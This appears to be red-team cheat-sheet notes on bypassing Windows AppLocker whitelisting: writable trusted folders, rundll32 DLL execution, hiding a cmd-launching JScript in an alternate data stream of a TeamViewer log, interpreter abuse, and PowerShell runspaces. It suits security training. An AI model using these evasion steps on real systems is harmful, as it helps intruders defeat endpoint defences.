# Application Whitelisting
## Basic Bypasses
### Trusted Folders
| Info | Command |
|:-----|:--------|
| Search recursivelly for writeable directories as user student | `accesschk.exe "student" C:\Windows -wus` |
| Check writeable folders to see if they are executeable | `icacls.exe C:\Windows\Tasks` |

### Bypass with DLLs
Compile the below as a DLL (TestDLL.dll) and run with `rundll32 TesttDLL.dll,run`

```c
#include "stdafx.h"
#include <Windows.h>
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD ul_reason_for_call,
                       LPVOID lpReserved

                     )

{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
extern "C" __declspec(dllexport) void run()
{
    MessageBoxA(NULL, "Execution happened", "Bypass", MB_OK);
}
```

### Alternative Data Streams
| Info | Command |
|:-----|:--------|
| 1. Create test.js file above | `echo var shell = new ActiveXObject("WScript.Shell"); > test.js & echo var res = shell.Run("cmd.exe"); >> test.js` | 
| 2. Create the file as an alternative data stream in a user writeable file | `type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"` |
| 3. Verify file has been created | `dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"` | 
| 4. Execute the alternative data stream | `wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_logfile.log:test.js"` | 

### Third Party Execution
AppLocker only enforces rules against native Windows executable data file types. If a third-party scripting engine like Python or Perl is installed, we could use it to very easily bypass application whitelisting.

| Info | Command |
|:-----|:--------|
| Create a payload | `echo print("This executed") > test.py` |
| Execute payload | `python test.py` |

## Bypassing Applocker with PowerShell
### PowerShell Constrained Language Mode
The PowerShell execution policy restricts the execution of scripts, but this is a weak protection mechanism which can be easily bypassed with the built-in "Bypass" execution policy. However, the more robust Language Modes limit the functionality to avoid execution of code like our shellcode runner and operates at three distinct levels.

1. The first (and default) level, FullLanguage, allows all cmdlets and the entire .NET framework as well as C# code execution. By contrast, NoLanguage disallows all script text. 
2. RestrictedLanguage offers a compromise, allowing default cmdlets but heavily restricting much else.
3. ConstrainedLanguage, scripts that are located in whitelisted locations or otherwise comply with a whitelisting rule can execute with full functionality. However, if a script does not comply with the rules, or if commands are entered directly on the command line, ConstrainedLanguage imposes numerous restrictions.

| Info | Command |
|:-----|:--------|
| Attempt to run .NET code | `[Math]::Cos(1)` | 
| Check Language Mode | `$ExecutionContext.SessionState.LanguageMode` |

### Custom Runspaces

```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
        }
    }
}
```

### Reflective Injection
## Bypassing Applocker with C#
### Locating a Target
### Reverse Engineering for load
### Give me code exec
### Invoking the Target part 1
### Invoking the Target part 2
## Bypassing Applocker with JScript
### JScript and MSHTA
### XSL Transform

